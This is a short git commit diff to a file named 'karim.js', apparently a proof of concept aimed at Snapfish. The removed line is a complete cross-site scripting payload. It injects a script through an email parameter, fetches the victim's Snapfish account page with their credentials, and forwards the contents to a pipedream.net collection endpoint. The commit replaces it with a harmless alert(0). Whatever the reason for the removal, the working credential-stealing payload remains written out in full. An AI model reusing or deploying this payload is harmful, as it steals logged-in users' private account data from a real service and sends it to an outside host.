57b2b27c43fbaeed3c75bc6dc2d5be0726f8ba72
Khaled samy <115103466+khaledsamy411@users.noreply.github.com>
2024-01-29 00:09:55 +0200

    Update karim.js

--- karim.js
+++ karim.js
@@ -1,3 +1,2 @@
 <script>
-    document.location="http://info.snapfish.com/pub/rf?_ri_=X0Gzc2X%3DUQpglLjHJlTQ76eQyRQ0SQzaKQQzgQvQI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DUQpglLjHJlTQ76eQyRQ0SQzaJQQGQvQeR&EMAIL_ADDRESS_=kario<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.snapfish.com/youraccount?tab=tab-1',true); req.withCredentials = true;req.send();function reqListener() {location='https://en0wwy1g0an7hi.x.pipedream.net?key='%2bthis.responseText; };%3c/script>&storeId=1"
-</script>
+alert(0)</script>
